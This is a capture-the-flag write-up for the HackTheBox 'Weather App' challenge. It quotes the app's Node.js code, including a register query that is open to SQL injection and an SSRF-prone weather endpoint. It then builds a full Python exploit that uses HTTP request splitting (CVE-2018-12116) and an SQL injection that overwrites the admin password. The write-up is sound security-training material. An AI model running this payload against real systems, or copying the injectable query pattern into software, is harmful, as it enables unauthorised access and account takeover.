---
layout: post
title: Weather App Challenge - HackTheBox
categories:
- Writeups
- Hackthebox
- Challenge
tags:
- javascript
- HTTP Request Splitting
- SSRF
- nodejs
- CVE-2018-12116
date: 2023-11-03 21:35 +0000
---

## Solution

We have three main endpoints:
 - /
 - /register
 - /login

Looking at the challenge code it seems like the task is to create a account as the user admin and login.

```js
router.post('/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return db.isAdmin(username, password)
			.then(admin => {
				if (admin) return res.send(fs.readFileSync('/app/flag').toString());
				return res.send(response('You are not admin'));
			})
			.catch(() => res.send(response('Something went wrong')));
	}
	
	return re.send(response('Missing parameters'));
});

```

The SQL of the register endpoint seems to be unprotected against SQL injections:

```js
    async register(user, pass) {
        // TODO: add parameterization and roll public
        return new Promise(async (resolve, reject) => {
            try {
                let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
                resolve((await this.db.run(query)));
            } catch(e) {
                reject(e);
            }
        });
    }
```

However the register endpoint is protected and has filters for the remote address that is requesting the endpoint:

```js
router.post('/register', (req, res) => {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}

	let { username, password } = req.body;

	if (username && password) {
		return db.register(username, password)
			.then(()  => res.send(response('Successfully registered')))
			.catch(() => res.send(response('Something went wrong')));
	}

	return res.send(response('Missing parameters'));
});
```

Only the 127.0.0.1 ip address has the ability to send post requests to the register endpoint.
Since we cannot send requests directly we need to find a SSRF that will send requests for us.
We have another endpoint `/api/weather` that allow us to specify an endpoint, city and country and with those values, request the weather information.

```js
router.post('/api/weather', (req, res) => {
	let { endpoint, city, country } = req.body;

	if (endpoint && city && country) {
		return WeatherHelper.getWeather(res, endpoint, city, country);
	}

	return res.send(response('Missing parameters'));
});	

module.exports = database => { 
	db = database;
	return router;
};
```

```js
module.exports = {
    async getWeather(res, endpoint, city, country) {

        // *.openweathermap.org is out of scope
        let apiKey = '10a62430af617a949055a46fa6dec32f';
        let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`); 
        
        if (weatherData.name) {
            let weatherDescription = weatherData.weather[0].description;
            let weatherIcon = weatherData.weather[0].icon.slice(0, -1);
            let weatherTemp = weatherData.main.temp;

            switch (parseInt(weatherIcon)) {
                case 2: case 3: case 4:
                    weatherIcon = 'icon-clouds';
                    break;
                case 9: case 10:
                    weatherIcon = 'icon-rain';
                    break;
                case 11:
                    weatherIcon = 'icon-storm';
                    break;
                case 13:
                    weatherIcon = 'icon-snow';
                    break;
                default:
                    weatherIcon = 'icon-sun';
                    break;
            }

            return res.send({
                desc: weatherDescription,
                icon: weatherIcon,
                temp: weatherTemp,
            });
        } 

        return res.send({
            error: `Could not find ${city} or ${country}`
        });
    }
}
```

It seems like the endpoint variable might be vulnerable to SSRF.
Testing it with webhook, we actually receive a request from the server, which means that it is vulnerable to SSRF. 
Now we need to take this vulnerability to send a post request to register.
However it uses a GET request function `HttpHelper.HttpGet` which is implemented by the server:

```js
const http = require('http');

module.exports = {
	HttpGet(url) {
		return new Promise((resolve, reject) => {
			http.get(url, res => {
				let body = '';
				res.on('data', chunk => body += chunk);
				res.on('end', () => {
					try {
						resolve(JSON.parse(body));
					} catch(e) {
						resolve(false);
					}
				});
			}).on('error', reject);
		});
	}
}
```

After trying a variety of things we ended up finding a vulnerability for this particular nodejs version, v8.12.0, in the `http.get` function(CVE-2018-12116).
The vulnerability allows an attacker to perform a http request inside a get request when the function `http.get` is used to the same address.
In the example bellow, two get requests are sent to the address 127.0.0.1:8000, one to the endpoint `/` and another to the endpoint `/private`.

```js
http.get('http://127.0.0.1:8000/?param=x\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:8000\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private)
```
Since we can control the endpoint variable in the url, we can try to exploit this vulnerability and make two different requests, one of them sent to the register endpoint using a POST request. Since we didn't find a POC with a POST request, we built [one](). The requests sent to solve this challenge have the following structure:

```
127.0.0.1:8000 HTTP/1.1
Host: 127.0.0.1

POST /register HTTP/1.1
Host:127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-length: <calculated in runtime>

username=admin&password=<insert sql injection here>

GET
```

Additionally, since the admin user already exists,

```js
    async migrate() {
        return this.db.exec(`
            DROP TABLE IF EXISTS users;

            CREATE TABLE IF NOT EXISTS users (
                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                username   VARCHAR(255) NOT NULL UNIQUE,
                password   VARCHAR(255) NOT NULL
            );

            INSERT INTO users (username, password) VALUES ('admin', '${ crypto.randomBytes(32).toString('hex') }');
        `);
    }
```

we need to update with a new password that we know:

```sql
test') ON CONFLICT (username) DO UPDATE SET password = 'admin123';--
```

The final exploit was built using python and is bellow:

```python
import requests

machine = "206.189.28.151:31751"

url = 'http://{}/api/weather'.format(machine)

space = '\u0120'
car_return = '\u010D'
new_line = '\u010A'
rn = car_return + new_line 

username = "admin"
password = "test') ON CONFLICT (username) DO UPDATE SET password = 'admin123';--".replace(" ", space).replace("'", "%27").replace('"', "%22")
address = "127.0.0.1/" 

content_type_header = "Content-Type:" + space + "application/x-www-form-urlencoded"
content_length = "Content-length:" + space + str(len(username) + len(password) + 19) # 19 is the characters from username= plus &password=
host_header = "Host:" + space + "127.0.0.1"
post_request = "POST" + space + "/register"
http_tag = "HTTP/1.1"
parameters = "username=" + username + "&password=" + password

payload = (address + space + http_tag + rn + 
           host_header + rn + rn +
           post_request + space + 
           http_tag + rn + 
           host_header + rn +
           content_type_header + rn + 
           content_length + rn + rn +
           parameters + rn + rn +
           "GET" + space
           )


'''
127.0.0.1:8000 HTTP/1.1
Host: 127.0.0.1

POST /register HTTP/1.1
Host:127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-length: X

username=admin&password=admin123

GET

'''

headers = {
    "Host": "{}".format(machine),
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://{}/".format(machine),
    "Content-Type": "application/json",
    "Origin": "http://{}".format(machine)
}

json = {"endpoint": payload,"city":"Lisbon","country":"PT"}
x = requests.post(url, json = json, headers=headers)
print(x.text)
```

Note: The last "GET" word is necessary so that we "comeback" to the first request which is the GET request. 


# References

- https://nodejs.org/en/blog/vulnerability/november-2018-security-releases#http-request-splitting-cve-2018-12116
- https://hackerone.com/reports/409943
- https://twitter.com/YShahinzadeh/status/1039396394195451904
